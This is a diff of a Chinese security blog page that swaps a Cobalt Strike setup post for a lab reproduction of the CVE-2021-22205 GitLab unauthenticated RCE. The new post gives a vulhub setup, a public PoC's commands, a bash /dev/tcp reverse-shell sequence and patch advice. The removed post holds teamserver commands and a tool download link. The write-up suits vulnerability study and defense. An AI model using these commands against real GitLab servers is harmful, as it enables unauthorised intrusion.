@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CobaltStrike">
+    <meta name="keywords" content="CVE-2021-22205">
     <meta name="description" content="专注于RedTeam,分享生活,分享知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>1、Cobaltstrike 安装与简介 | Taoing&#39;s Blog</title>
+    <title>CVE-2021-22205 GitLab 未授权RCE | Taoing&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -323,12 +323,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160634813_7205.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220605182.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">1、Cobaltstrike 安装与简介</h1>
+                    <h1 class="description center-align post-title">CVE-2021-22205 GitLab 未授权RCE</h1>
                 </div>
             </div>
         </div>
@@ -444,8 +444,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CobaltStrike/">
-                                <span class="chip bg-color">CobaltStrike</span>
+                            <a href="/tags/GitLab/">
+                                <span class="chip bg-color">GitLab</span>
                             </a>
                         
                     </div>
@@ -456,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -469,21 +469,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-10
+                    2021-10-29
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-10
+                    2021-10-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    515
+                    566
                 </div>
                 
 
@@ -513,38 +513,52 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-Cobaltstrike-安装与简介"><a href="#1-Cobaltstrike-安装与简介" class="headerlink" title="1.Cobaltstrike 安装与简介"></a>1.Cobaltstrike 安装与简介</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><pre class="line-numbers language-none"><code class="language-none">Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人内称为CS.自去年起，
-Cobaltstrike升级到3.0版本，脱离了MSF框架后在国内安全圈大火，成为了渗透测试中不可缺少的利器。
-其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socks代理，office攻击，文件捆绑，钓鱼等功能。
-同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。
-目前已是4.1版本
-项目官网:https:&#x2F;&#x2F;www.cobaltstrike.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="二、cobaltstike的架构"><a href="#二、cobaltstike的架构" class="headerlink" title="二、cobaltstike的架构"></a>二、cobaltstike的架构</h3><p>本人使用的是Cabaltstrike4.0版本，虽然官方已经更新到4.1版本，但是最近都在说有后门、因此不推荐使用<br>3.13版本文件架构如下。</p>
-<p>│ Scripts 用户安装的插件<br>│ Log 每天的日志<br>│ c2lint 检查profile的错误异常<br>│ cobaltstrike<br>│ cobaltstrike.jar 客户端程序<br>│ icon.jpg LOGO<br>│ license.pdf 许可证文件<br>│ readme.txt<br>│ releasenotes.txt<br>│ teamserver 服务端程序<br>│ update<br>│ update.jar 更新程序<br>└─third-party 第三方工具，里面放的vnc d</p>
-<h3 id="三、Cobaltstrike安装"><a href="#三、Cobaltstrike安装" class="headerlink" title="三、Cobaltstrike安装"></a>三、Cobaltstrike安装</h3><ul>
-<li>1、Linux环境配置示例(需提前安装好Java与JDK)：推荐使用ubantu16.4<pre class="line-numbers language-none"><code class="language-none">安装java jdk:
-sudo apt-get update   #更新软件包列表
-sudo apt-get install openjdk-8-jdk   #安装openjdk-8-jdk
-java -version  #查看java版本
-apt-get install screen     #screen后台运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605839_20200820153105091_21017.png"></li>
-<li>2、上传Cobaltstrike程序至服务器</li>
-</ul>
-<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820153633259_478.png"></p>
+                <h2 id="CVE-2021-22205-GitLab-未授权RCE"><a href="#CVE-2021-22205-GitLab-未授权RCE" class="headerlink" title="CVE-2021-22205 GitLab 未授权RCE"></a>CVE-2021-22205 GitLab 未授权RCE</h2><h3 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a>漏洞简介：</h3><p>GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web服务。</p>
+<p>GitLab是一款Ruby开发的Git项目管理平台。如11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a target="_blank" rel="noopener" href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执</p>
+<p>参考链接：</p>
 <ul>
-<li>3、服务端搭建</li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li>
+<li><a target="_blank" rel="noopener" href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md</a></li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">cd cobaltstrike4.0   #进入cobaltstrike4.0目录
-ls    #查看目录下文件
-chmod + 777 teamserver    #将团队服务权限调制最高，或者执行权限。(这里是我懒直接777最高)
-vim teamserver  #进入进行修改端口以及指纹信息、更改cs的默认ssl证书信息也很重要不然凉犊子。防止0day，改了最好<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160335579_23479.png"></p>
-<ul>
-<li>4、运行</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">screen .&#x2F;teamserver ip 密码         #第一种在linux在后台运行
-nohup .&#x2F;teamserver ip 密码         #第二种在linux在后台运行 推荐<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160416500_31271.png"><br>windows运行start.bat即可<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160606921_6852.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160529056_1736.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605840_20200820160634813_7205.png"><br>工具地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1BA61luBY6mktNf7DFzzMhg">https://pan.baidu.com/s/1BA61luBY6mktNf7DFzzMhg</a> 提取码：qwer</p>
+<h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><pre class="line-numbers language-none"><code class="language-none">该漏洞影响以下GitLab企业版和社区版：
+11.9 &lt;&#x3D; GitLab（CE&#x2F;EE）&lt; 13.8.8
+13.9 &lt;&#x3D; GitLab（CE&#x2F;EE）&lt; 13.9.6
+13.10 &lt;&#x3D;GitLab（CE&#x2F;EE）&lt; 13.10.3
+本文复现版本：Gitlab CE 13.10.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>建议内存&gt;8</p>
+<p>执行如下命令启动一个GitLab 13.10.1版本服务器：</p>
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git
+cd vulhub&#x2F;gitlab&#x2F;CVE-2021-22205&#x2F;
+docker-compose up -d
+环境启动后，访问http:&#x2F;&#x2F;your-ip:8080即可查看到GitLab的登录页面。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029214111000.png" alt="GitLab首页"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h4><p><code>https://github.com/Al1ex/CVE-2021-22205</code></p>
+<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p><code>python CVE-2021-22205.py  -v true -t http://Your IP:Port</code></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029214708935.png" alt="漏洞探测"></p>
+<p><strong>命令执行：</strong></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029215055570.png" alt="dnslog验证"></p>
+<p><strong>反弹shell：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，对写入成功的sh脚本加执行权限
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，运行反弹shell脚本
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029215631594.png" alt="反弹shell写入1.sh脚本"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220042720.png" alt="写入成功验证"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220215319.png" alt="修改脚本权限"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220251930.png" alt="验证修改权限成功"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220538808.png" alt="反弹shell"></p>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220605182.png" alt="大部分权限都是git这里需要提权"></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1、及时升级GitLab至最新安全版本</p>
+<p>2、配置访问控制策略，避免受影响的GitLab暴露在公</p>
 
                 
             </div>
@@ -571,7 +585,7 @@ nohup .&#x2F;teamserver ip 密码         #第二种在linux在后台运行 推�
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Ta0ing.github.io/article/a8d93643.html">http://Ta0ing.github.io/article/a8d93643.html</a>
+                    <a href="http://Ta0ing.github.io/article/659abcc5.html">http://Ta0ing.github.io/article/659abcc5.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -609,8 +623,8 @@ nohup .&#x2F;teamserver ip 密码         #第二种在linux在后台运行 推�
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CobaltStrike/">
-                                    <span class="chip bg-color">CobaltStrike</span>
+                                <a href="/tags/GitLab/">
+                                    <span class="chip bg-color">GitLab</span>
                                 </a>
                             
                         </div>
@@ -656,76 +670,28 @@ nohup .&#x2F;teamserver ip 密码         #第二种在linux在后台运行 推�
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/article/b916b10c.html">
+                <a href="/article/659abcc5.html">
                     <div class="card-image">
                         
-                        <img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607605832_20200820173118299_27983.png" class="responsive-img" alt="2、Cobaltstrike Listener与Payload生成">
+                        <img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220605182.png" class="responsive-img" alt="CVE-2021-22205 GitLab 未授权RCE">
                         
-                        <span class="card-title">2、Cobaltstrike Listener与Payload生成</span>
+                        <span class="card-title">CVE-2021-22205 GitLab 未授权RCE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-10
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                    内网渗透
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CobaltStrike/">
-                        <span class="chip bg-color">CobaltStrike</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/article/a1981ad3.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="CVE-2020【14750,14882,14883】weblogic未授权命令执行复现">
-                        
-                        <span class="card-title">CVE-2020【14750,14882,14883】weblogic未授权命令执行复现</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
+                            GitLab使用了图片处理工具ExifTool而受到漏洞CVE-2021-22204的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-29
                             </span>
                         <span class="publish-author">
                             
@@ -739,23 +705,61 @@ nohup .&#x2F;teamserver ip 密码         #第二种在linux在后台运行 推�
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/weblogic/">
-                        <span class="chip bg-color">weblogic</span>
+                    <a href="/tags/GitLab/">
+                        <span class="chip bg-color">GitLab</span>
                     </a>
                     
-                    <a href="/tags/CVE-2020-14750/">
-                        <span class="chip bg-color">CVE-2020-14750</span>
-                    </a>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/article/da8eafa9.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="国外扫描工具-Nuclei">
+                        
+                        <span class="card-title">国外扫描工具-Nuclei</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            文章摘要
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BA%93/" class="post-category">
+                                    安全工具库
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
                     
-                    <a href="/tags/CVE-2020-14882/">
-                        <span class="chip bg-color">CVE-2020-14882</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2020-14883/">
-                        <span class="chip bg-color">CVE-2020-14883</span>
+                    <a href="/tags/Nuclei/">
+                        <span class="chip bg-color">Nuclei</span>
                     </a>
                     
                 </div>
